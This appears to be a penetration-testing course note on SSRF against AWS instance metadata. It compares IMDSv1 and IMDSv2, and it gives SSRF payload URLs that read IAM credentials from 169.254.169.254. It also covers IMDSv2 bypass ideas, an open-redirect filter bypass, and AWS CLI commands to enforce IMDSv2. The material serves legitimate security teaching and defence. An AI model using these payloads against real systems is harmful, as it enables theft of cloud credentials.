---
tags: [vapt, ssrf, cloud, intermediate]
difficulty: intermediate
module: "13 - SSRF"
topic: "13.10 SSRF — AWS IMDSv1 vs IMDSv2"
---

# 13.10 — AWS IMDSv1 vs IMDSv2

## What Is IMDSv2?

```
IMDSv1 (Instance Metadata Service version 1):
  Simple GET request to 169.254.169.254
  No authentication required!
  Any process on the instance can read it
  Vulnerable to SSRF!
  
IMDSv2 (Instance Metadata Service version 2):
  Added in November 2019 by AWS
  Session-oriented: requires a PUT request first to get a token
  Then: include token in every GET request
  
  GOAL: Block SSRF attacks!
  If SSRF only allows GET requests (HTML img, fetch GET, etc.)
  → Can't get the token → can't read metadata!
  
  BUT: If SSRF allows PUT OR follows redirects → IMDSv2 can still be bypassed!
```

---

## IMDSv1 Attack (No Protection)

```bash
# CLASSIC SSRF TO AWS IMDSv1:
# Step 1: Get role name
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Step 2: Get credentials
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# That's it! No token needed with IMDSv1!
# If app is on EC2 and hasn't enabled IMDSv2-required → still works!
```

---

## IMDSv2 Flow

```
IMDSv2 REQUIRES TWO STEPS:

STEP 1 — GET A SESSION TOKEN (PUT request):
  PUT http://169.254.169.254/latest/api/token HTTP/1.1
  X-aws-ec2-metadata-token-ttl-seconds: 21600
  
  Response:
  AQAAAxxxxTHE_TOKEN_VALUExxxxxx==

STEP 2 — USE TOKEN IN METADATA REQUESTS:
  GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
  X-aws-ec2-metadata-token: AQAAAxxxxTHE_TOKEN_VALUExxxxxx==
  
  Response: EC2InstanceRole

STEP 3 — GET CREDENTIALS:
  GET http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2InstanceRole HTTP/1.1
  X-aws-ec2-metadata-token: AQAAAxxxxTHE_TOKEN_VALUExxxxxx==
  
  Response: {"AccessKeyId": "...", "SecretAccessKey": "...", "Token": "..."}

WHY THIS BLOCKS MOST SSRF:
  SSRF via <img src="..."> → GET only → can't PUT → can't get token!
  SSRF via fetch() GET → same issue
  SSRF via URL parameter that makes GET → blocked!
```

---

## Bypassing IMDSv2

### Method 1 — SSRF That Allows PUT

```
IF THE APP MAKES PUT REQUESTS FOR SSRF:
  Example: WebDAV server, S3-like API
  
  Step 1: Use SSRF to PUT to 169.254.169.254/latest/api/token
          with header: X-aws-ec2-metadata-token-ttl-seconds: 21600
  
  Step 2: Get the token from PUT response
  
  Step 3: Use SSRF GET with X-aws-ec2-metadata-token: TOKEN

PRACTICAL: Rare, but worth testing if app supports multiple HTTP methods in SSRF!
```

### Method 2 — Open Redirect to IMDSv2

```
SCENARIO: App does SSRF to a URL but that URL can redirect!

  target.com/fetch?url=https://external.com/path
  
  If external.com redirects to 169.254.169.254...
  
  BUT for IMDSv2, the token must be in the request.
  A redirect to IMDSv1 path still works even on IMDSv2 instances
  IF: IMDSv2 is not enforced (just preferred, not required)!
  
  IMPORTANT DISTINCTION:
  - IMDSv2 "optional" (aws:ec2:metadata-options:http-tokens = optional) → IMDSv1 still works!
  - IMDSv2 "required" (aws:ec2:metadata-options:http-tokens = required) → only IMDSv2 works
  
  Many AWS deployments still have IMDSv2 as optional → IMDSv1 SSRF still works!
```

### Method 3 — IMDSv2 Hop Count Bypass

```
IMDSv2 ADDS: http-hop-limit

Default hop limit: 1
This prevents IMDSv2 token from being fetched via
external networks (TTL expires before reaching metadata!)

NORMAL SSRF (victim server on EC2):
  Attacker → victim server (1 hop) → metadata (2nd hop)
  
  With hop limit = 1:
  Token request from victim server → metadata at 1 hop → works!
  
  BUT: If victim is behind another proxy:
  Attacker → proxy (1) → victim (2) → metadata (3rd hop)
  Hop limit exceeded → token request fails!
  
  So hop-limit is more about preventing multi-hop SSRF
  than single-hop from the instance itself.
  
  For direct SSRF on an EC2 app → IMDSv2 (optional mode) still vulnerable!
```

---

## Checking If IMDSv2 Is Enforced

```bash
# AS PENTESTER WITH SSRF:
# Try IMDSv1 (GET without token):
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# If you get: 401 Unauthorized → IMDSv2 enforced!
# If you get: role name → IMDSv1 works! (IMDSv2 optional or not configured)

# AS AWS ADMIN (checking your own infra):
aws ec2 describe-instances --query 'Reservations[].Instances[].MetadataOptions'
# Look for: "HttpTokens": "required" → IMDSv2 enforced
#           "HttpTokens": "optional" → IMDSv1 still works!

# ENFORCE IMDSv2 ON EXISTING INSTANCE:
aws ec2 modify-instance-metadata-options \
  --instance-id i-1234567890abcdef0 \
  --http-tokens required \
  --http-endpoint enabled
```

---

## SSRF Bypass via Open Redirect to Metadata (IMDSv1 Path)

```
PortSwigger Lab Scenario:
  SSRF is filtered: blocks 127.0.0.1 and 169.254.169.254
  
  But app has: GET /product/nextProduct?currentProductId=6&path=/product/stock
  → It redirects to /product/stock
  
  USE OPEN REDIRECT TO BYPASS FILTER:
  url=http://target.com/product/nextProduct?currentProductId=6&path=http://169.254.169.254/latest/meta-data/
  
  App checks URL: it's target.com → allowed!
  App fetches: target.com/product/nextProduct...
  target.com redirects to: http://169.254.169.254/latest/meta-data/
  App follows redirect! → SSRF bypass!
  
  FILTER BYPASS VIA OPEN REDIRECT:
  1. Find open redirect on allowed domain
  2. Point redirect to 169.254.169.254
  3. Use the open redirect URL as SSRF target
```

---

## Related Notes
- [[09 - SSRF Cloud Metadata]] — metadata endpoints
- [[14 - SSRF Localhost Bypass]] — bypassing IP filters
- [[17 - SSRF WAF Bypass]] — bypassing URL filters
- [[19 - SSRF to Cloud Credential Theft]] — exploitation chain
- [[20 - Defense Allowlists IMDSv2]] — enforcing IMDSv2
